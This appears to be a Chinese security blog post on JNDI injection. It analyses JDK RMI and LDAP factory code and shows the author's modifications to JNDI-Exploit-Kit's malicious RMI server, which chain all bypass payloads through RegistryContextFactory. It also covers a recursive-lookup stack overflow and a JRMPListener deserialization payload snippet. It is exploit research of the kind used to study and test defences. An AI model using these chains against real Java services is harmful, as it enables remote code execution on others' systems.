<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>JNDI漏洞利用探索 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="JNDI漏洞利用探索"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>JNDI漏洞利用探索</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2022/01/19/JNDI漏洞利用探索/" rel="bookmark">
        <time class="entry-date published" datetime="2022-01-19T12:51:11.000Z">
          2022-01-19
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>​    最近学习了<code>浅蓝</code>师傅寻找的一些JNDI漏洞的利用链受益匪浅，自己也尝试关于JNDI漏洞利用做一些挖掘，目前JNDI在利用过程我想到了两个问题。</p>
<ul>
<li>测试每一个JNDI Bypass 利用链都需要手动更改URL很不方便，能否我去请求一个地址，让目标将我所有的链跑一遍？</li>
<li>JNDI利用过程中可以通过反序列化利用，能否自动化探测反序列化利用链？</li>
</ul>
<span id="more"></span>

<h2 id="自动测试Bypass-利用链"><a href="#自动测试Bypass-利用链" class="headerlink" title="自动测试Bypass 利用链"></a>自动测试Bypass 利用链</h2><p>​    为了让这种方式更加通用，我们首先考虑的是JDK原生的实现<code>ObjectFactory</code>的类，那么我注意到了下面几个类。</p>
<ul>
<li>com.sun.jndi.rmi.registry.RegistryContextFactory</li>
<li>com.sun.jndi.ldap.LdapCtxFactory</li>
</ul>
<h3 id="RegistryContextFactory"><a href="#RegistryContextFactory" class="headerlink" title="RegistryContextFactory"></a>RegistryContextFactory</h3><h4 id="调用分析"><a href="#调用分析" class="headerlink" title="调用分析"></a>调用分析</h4><p>​    通过<code>getURLs</code>从Reference获取url列表并封装为数组，<code>URLsToObject</code>中对数组中的URL列表发起<code>RMI</code>请求，所以RegistryContextFactory满足我们的需求。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//判断是否为引用对象并且factoryClassname为RegistryContextFactory</span></span><br><span class="line">       <span class="keyword">if</span> (!isRegistryRef(var1)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//从引用对象中获取URL列表并循环发起调用</span></span><br><span class="line">           Object var5 = URLsToObject(getURLs((Reference)var1), var4);</span><br><span class="line">           <span class="keyword">if</span> (var5 <span class="keyword">instanceof</span> RegistryContext) &#123;</span><br><span class="line">               RegistryContext var6 = (RegistryContext)var5;</span><br><span class="line">               var6.reference = (Reference)var1;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> var5;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>getURLs获取URL必须满足RefAddr是StringRefAddr类型且Type属性为URL才会保存。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> String[] getURLs(Reference var0) <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">      <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line">      String[] var2 = <span class="keyword">new</span> String[var0.size()];</span><br><span class="line">      Enumeration var3 = var0.getAll();</span><br><span class="line"><span class="comment">//从RefAddr中获取url并保存到数组中</span></span><br><span class="line">      <span class="keyword">while</span>(var3.hasMoreElements()) &#123;</span><br><span class="line">          RefAddr var4 = (RefAddr)var3.nextElement();</span><br><span class="line">          <span class="comment">//只有RefAddr是StringRefAddr类型，且Type属性为URL才会保存</span></span><br><span class="line">          <span class="keyword">if</span> (var4 <span class="keyword">instanceof</span> StringRefAddr &amp;&amp; var4.getType().equals(<span class="string">&quot;URL&quot;</span>)) &#123;</span><br><span class="line">              var2[var1++] = (String)var4.getContent();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (var1 == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;Reference contains no valid addresses&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == var0.size()) &#123;</span><br><span class="line">          <span class="keyword">return</span> var2;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//返回URL数组</span></span><br><span class="line">          String[] var5 = <span class="keyword">new</span> String[var1];</span><br><span class="line">          System.arraycopy(var2, <span class="number">0</span>, var5, <span class="number">0</span>, var1);</span><br><span class="line">          <span class="keyword">return</span> var5;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>URLsToObject中创建<code>rmiURLContextFactory</code>对象并调用<code>getObjectInstance</code>。<code>getObjectInstance</code>中判断传入的object类型如果是数组则调用<code>getUsingURLs</code>.</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">URLsToObject</span><span class="params">(String[] var0, Hashtable&lt;?, ?&gt; var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    rmiURLContextFactory var2 = <span class="keyword">new</span> rmiURLContextFactory();</span><br><span class="line">    <span class="keyword">return</span> var2.getObjectInstance(var0, (Name)<span class="keyword">null</span>, (Context)<span class="keyword">null</span>, var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> rmiURLContext(var4);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        <span class="keyword">return</span> getUsingURL((String)var1, var4);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> String[]) &#123;</span><br><span class="line">        <span class="comment">//数组类型</span></span><br><span class="line">        <span class="keyword">return</span> getUsingURLs((String[])((String[])var1), var4);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;rmiURLContextFactory.getObjectInstance: argument must be an RMI URL String or an array of them&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>getUsingURLs创建<code>rmiURLContext</code>并循环调用lookup发起RMI调用直到获取一个对象并返回。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">getUsingURLs</span><span class="params">(String[] var0, Hashtable&lt;?, ?&gt; var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (var0.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;rmiURLContextFactory: empty URL array&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            rmiURLContext var2 = <span class="keyword">new</span> rmiURLContext(var1);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                NamingException var3 = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">int</span> var4 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(var4 &lt; var0.length) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object var5 = var2.lookup(var0[var4]);</span><br><span class="line">                        <span class="keyword">return</span> var5;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NamingException var9) &#123;</span><br><span class="line">                        var3 = var9;</span><br><span class="line">                        ++var4;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> var3;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                var2.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><p>​    通过<code>RegistryContextFactory</code>利用只能使用<code>rmi</code>协议发起请求，所以目前只能用这种方式检测rmi相关的利用，在<code>Orange</code>师傅的<code>JNDI-Exploit-Kit</code>工具中集成了一部分关于RMI的利用链，其中也包含了<code>Tomcat</code>和<code>GROOVY</code>的bypass，当然Groovy的执行也依赖Tomcat。工具运行后会生成一些RMI的URL，我们可以将<code>RegistryContextFactory</code>也加到利用链中。</p>
<p>​    在<code>RMIRefServer</code>中包含了RMI处理的逻辑，因此可以把<code>RegistryContextFactory</code>引用也注册进去。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Fuzz All Bypass</span></span><br><span class="line"><span class="comment">     * Created by 藏青</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResourceRef <span class="title">execAll</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException, NamingException</span>&#123;</span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;xxxx&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="keyword">true</span>, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//Mapper.references中保存了随机生成的rmi名称和利用方式的关系</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : Mapper.references.entrySet()) &#123;</span><br><span class="line">            String mapKey = entry.getKey();</span><br><span class="line">            String mapValue = entry.getValue();</span><br><span class="line">            <span class="comment">//如果是RegistryContextFactory则跳过，否则会造成递归查询</span></span><br><span class="line">            <span class="keyword">if</span>(!mapValue.equals(<span class="string">&quot;BypassTestAll&quot;</span>))&#123;</span><br><span class="line">                ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;URL&quot;</span>,String.format(<span class="string">&quot;rmi://%s:1099/%s&quot;</span>, ServerStart.rmi_addr,mapKey)));</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>RMIRefServer#handleRMI</code>中会根据请求的url找到对应的处理方法生成引用对象并返回，所以我们只要将我们构造的<code>execAll</code>方法也加入到if判断中即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">handleRMI</span> <span class="params">( ObjectInputStream ois, DataOutputStream out )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> method = ois.readInt(); <span class="comment">// method</span></span><br><span class="line">       ois.readLong(); <span class="comment">// hash</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ( method != <span class="number">2</span> ) &#123; <span class="comment">// lookup</span></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">	<span class="comment">//获取rmi请求的对象名称，这里是随机生成的额名称</span></span><br><span class="line">       String object = (String) ois.readObject();</span><br><span class="line">       System.out.println(getLocalTime() + <span class="string">&quot; [RMISERVER]  &gt;&gt; Is RMI.lookup call for &quot;</span> + object + <span class="string">&quot; &quot;</span> + method);</span><br><span class="line"></span><br><span class="line">       String cpstring = <span class="keyword">this</span>.classpathUrl.toString();</span><br><span class="line">    <span class="comment">//根据取出的名称从Mapper.references中取出利用方式对应的名称</span></span><br><span class="line">       String reference = Mapper.references.get(object);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (reference == <span class="keyword">null</span>) &#123;</span><br><span class="line">           System.out.println(getLocalTime() + <span class="string">&quot; [RMISERVER]  &gt;&gt; Reference that matches the name(&quot;</span> + object + <span class="string">&quot;) is not found.&quot;</span>);</span><br><span class="line">           <span class="comment">//return false;</span></span><br><span class="line">           cpstring = <span class="string">&quot;BypassByGroovy&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       URL turl = <span class="keyword">new</span> URL(cpstring + <span class="string">&quot;#&quot;</span> + reference);</span><br><span class="line">       out.writeByte(TransportConstants.Return);<span class="comment">// transport op</span></span><br><span class="line">       <span class="keyword">try</span> ( ObjectOutputStream oos = <span class="keyword">new</span> MarshalOutputStream(out, turl) ) &#123;</span><br><span class="line"></span><br><span class="line">           oos.writeByte(TransportConstants.NormalReturn);</span><br><span class="line">           <span class="keyword">new</span> UID().write(oos);</span><br><span class="line">		<span class="comment">//创建ReferenceWrapper包装类</span></span><br><span class="line">           ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);</span><br><span class="line">	<span class="comment">//	根据名称不同调用不同的方法得到对应的引用对象</span></span><br><span class="line">           <span class="keyword">if</span> (reference.startsWith(<span class="string">&quot;BypassByEL&quot;</span>))&#123;</span><br><span class="line">               System.out.println(getLocalTime() + <span class="string">&quot; [RMISERVER]  &gt;&gt; Sending local classloading reference for BypassByEL.&quot;</span>);</span><br><span class="line">               Reflections.setFieldValue(rw, <span class="string">&quot;wrappee&quot;</span>, execByEL());</span><br><span class="line"></span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (reference.startsWith(<span class="string">&quot;BypassByGroovy&quot;</span>))&#123;</span><br><span class="line">               System.out.println(getLocalTime() + <span class="string">&quot; [RMISERVER]  &gt;&gt; Sending local classloading reference for BypassByGroovy.&quot;</span>);</span><br><span class="line">               Reflections.setFieldValue(rw, <span class="string">&quot;wrappee&quot;</span>, execByGroovy());</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//将我们的构造的execAll方法加到判断中</span></span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span> (reference.startsWith(<span class="string">&quot;BypassTestAll&quot;</span>))&#123;</span><br><span class="line">               System.out.println(getLocalTime() + <span class="string">&quot; [RMISERVER]  &gt;&gt; Sending local classloading reference for BypassTestAll.&quot;</span>);</span><br><span class="line">               Reflections.setFieldValue(rw, <span class="string">&quot;wrappee&quot;</span>, execAll());</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span> &#123;</span><br><span class="line">               System.out.println(</span><br><span class="line">                       String.format(</span><br><span class="line">                               getLocalTime() + <span class="string">&quot; [RMISERVER]  &gt;&gt; Sending remote classloading stub targeting %s&quot;</span>,</span><br><span class="line">                               <span class="keyword">new</span> URL(cpstring + reference.concat(<span class="string">&quot;.class&quot;</span>))));</span><br><span class="line"></span><br><span class="line">               Reflections.setFieldValue(rw, <span class="string">&quot;wrappee&quot;</span>, <span class="keyword">new</span> Reference(<span class="string">&quot;Foo&quot;</span>, reference, turl.toString()));</span><br><span class="line">           &#125;</span><br><span class="line">           Field refF = RemoteObject.class.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">           refF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           refF.set(rw, <span class="keyword">new</span> UnicastServerRef(<span class="number">12345</span>));</span><br><span class="line"></span><br><span class="line">           oos.writeObject(rw);</span><br><span class="line"></span><br><span class="line">           oos.flush();</span><br><span class="line">           out.flush();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>​        由于<code>util.Mapper#references</code>中包含了引用关系，所以这里也需要做下更改。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">...</span><br><span class="line">   references.put(RandomStringUtils.randomAlphanumeric(<span class="number">6</span>).toLowerCase(),<span class="string">&quot;BypassTestAll&quot;</span>);</span><br><span class="line">instructions.put(<span class="string">&quot;BypassTestAll&quot;</span>,<span class="string">&quot;Build in &quot;</span>+ withColor(<span class="string">&quot;JDK - (BYPASSAll by @藏青)&quot;</span>,ANSI_RED) +<span class="string">&quot; whose test All Bypass Payload&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    当然我们也可以把之前分析的一些利用链也加进去，但是这并不是我们本片文章的重点，就不分析了。添加并启动后，可以看到我们我们添加的利用链地址。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220121111647419.png" alt="image-20220121111647419"></p>
<p>​    在tomcat中请求我们创建的<code>registry</code>会将所有的利用链跑一遍，如果利用失败则会导致异常进入下一个利用链，直到跑成功获取对象并返回。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220121111904290.png" alt="image-20220121111904290"></p>
<p>​        我们也可以从server端进行验证，因为我这里使用的tomcat8所以跑到el表达式后利用成功并返回。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220121112023368.png" alt="image-20220121112023368"></p>
<h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>​    忽然想到如果我们在引用中的地址也是<code>RegistryContextFactory</code>那不就会导致递归的lookup查询，是否会产生什么问题。服务端代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"> Reference ref = <span class="keyword">new</span> Reference(<span class="string">&quot;javax.sql.DataSource&quot;</span>,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"> ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;URL&quot;</span>,<span class="string">&quot;rmi://127.0.0.1:1099/Foo&quot;</span>));</span><br><span class="line"> ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line"> registry.bind(<span class="string">&quot;Foo&quot;</span>, wrapper);</span><br></pre></td></tr></table></figure>

<p>​    经过测试递归查询会触发tomcat的栈溢出异常，但是并不会对程序的使用产生影响。</p>
<p><img src="/2022/01/19/JNDI%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/image-20220120115347424.png" alt="image-20220120115347424"></p>
<h3 id="LdapCtxFactory"><a href="#LdapCtxFactory" class="headerlink" title="LdapCtxFactory"></a>LdapCtxFactory</h3><p><code>LdapCtxFactory</code>和<code>RegistryContextFactory</code>相对应，具体的过程不分析了，最终是通过<code>LdapCtxFactory#getUsingURL</code>来执行，但是只会获取到<code>DirContext</code>并没有调用Lookup方法，所以似乎不能利用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> DirContext <span class="title">getUsingURL</span><span class="params">(String var0, Hashtable&lt;?, ?&gt; var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">      Object var2 = <span class="keyword">null</span>;</span><br><span class="line">      LdapURL var3 = <span class="keyword">new</span> LdapURL(var0);</span><br><span class="line">      String var4 = var3.getDN();</span><br><span class="line">      String var5 = var3.getHost();</span><br><span class="line">      <span class="keyword">int</span> var6 = var3.getPort();</span><br><span class="line">      String var8 = <span class="keyword">null</span>;</span><br><span class="line">      String[] var7;</span><br><span class="line">      <span class="keyword">if</span> (var5 == <span class="keyword">null</span> &amp;&amp; var6 == -<span class="number">1</span> &amp;&amp; var4 != <span class="keyword">null</span> &amp;&amp; (var8 = ServiceLocator.mapDnToDomainName(var4)) != <span class="keyword">null</span> &amp;&amp; (var7 = ServiceLocator.getLdapService(var8, var1)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">          String var9 = var3.getScheme() + <span class="string">&quot;://&quot;</span>;</span><br><span class="line">          String[] var10 = <span class="keyword">new</span> String[var7.length];</span><br><span class="line">          String var11 = var3.getQuery();</span><br><span class="line">          String var12 = var3.getPath() + (var11 != <span class="keyword">null</span> ? var11 : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">int</span> var13 = <span class="number">0</span>; var13 &lt; var7.length; ++var13) &#123;</span><br><span class="line">              var10[var13] = var9 + var7[var13] + var12;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          var2 = getUsingURLs(var10, var1);</span><br><span class="line">          ((LdapCtx)var2).setDomainName(var8);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          var2 = <span class="keyword">new</span> LdapCtx(var4, var5, var6, var1, var3.useSsl());</span><br><span class="line">          ((LdapCtx)var2).setProviderUrl(var0);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//返回DirContext对象</span></span><br><span class="line">      <span class="keyword">return</span> (DirContext)var2;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="自动测试反序列化利用链"><a href="#自动测试反序列化利用链" class="headerlink" title="自动测试反序列化利用链"></a>自动测试反序列化利用链</h2><p>​        通过对问题一的分析，我们现在只能利用<code>RMI</code>协议来协助我们一次性发起多个RMI调用，目前的大多数工具都是基于Ldap来进行反序列化利用的，不过在RMI中也可以通过反序列化利用。</p>
<p>​        首先我们要利用的场景是去通过RMI攻击客户端，所以可以利用<code>ysoserial#JRMPListener</code>模块来利用，它构建了一个<code>JRMP</code>监听，当客户端发起请求时会构建一个异常对象<code>BadAttributeValueExpException</code>，并在这个异常对象的<code>val</code>属性中放入我们要构造好的恶意对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   out.writeByte(TransportConstants.Return);<span class="comment">// transport op</span></span><br><span class="line">      ObjectOutputStream oos = <span class="keyword">new</span> JRMPClient.MarshalOutputStream(out, <span class="keyword">this</span>.classpathUrl);</span><br><span class="line"><span class="comment">//写入异常标识</span></span><br><span class="line">      oos.writeByte(TransportConstants.ExceptionalReturn);</span><br><span class="line">      <span class="keyword">new</span> UID().write(oos);</span><br><span class="line"><span class="comment">//构建BadAttributeValueExpException异常对象，并在val属性中加入恶意对象。</span></span><br><span class="line">      BadAttributeValueExpException ex = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">      Reflections.setFieldValue(ex, <span class="string">&quot;val&quot;</span>,payload );</span><br><span class="line">      oos.writeObject(ex);</span><br></pre></td></tr></table></figure>

<p>当客户端发起请求时,会在<code>StreamRemoteCall#executeCall</code>中通过判断<code>returnType</code>是否为<code>TransportConstants#ExceptionalReturn</code>来决定是否反序列化，也就是只有返回出现异常时才会对异常对象进行反序列化。</p>
